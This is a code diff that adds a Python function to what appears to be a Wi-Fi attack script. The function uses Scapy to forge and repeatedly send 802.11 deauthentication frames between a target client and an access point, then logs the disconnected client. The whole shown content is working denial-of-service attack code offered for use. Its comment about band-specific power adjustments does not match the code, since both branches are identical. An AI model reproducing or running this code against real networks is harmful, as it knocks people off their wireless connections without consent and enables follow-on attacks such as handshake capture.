@@ -40,3 +40,22 @@ def log_client(mac, reason=""):
         except IOError as e:
             print(f"[!] Log error: {e}")
 
+def deauth(mac, reason=""):
+    """Enhanced deauth with band optimization"""
+    try:
+        # Dual deauth packets (client+AP targeted)
+        pkt1 = RadioTap()/Dot11(addr1=mac, addr2=bssid, addr3=bssid)/Dot11Deauth()
+        pkt2 = RadioTap()/Dot11(addr1=bssid, addr2=mac, addr3=bssid)/Dot11Deauth()
+        
+        # Band-specific power adjustments
+        if BAND == '5':
+            sendp([pkt1, pkt2], iface=iface, count=deauth_count, 
+                 inter=deauth_interval, verbose=0)
+        else:  # 2.4GHz
+            sendp([pkt1, pkt2], iface=iface, count=deauth_count, 
+                 inter=deauth_interval, verbose=0)
+        
+        log_client(mac, reason)
+        print(f"[+] Deauthed {mac} on {BAND}GHz")
+    except Exception as e:
+        print(f"[!] Deauth failed for {mac}: {str(e)}")
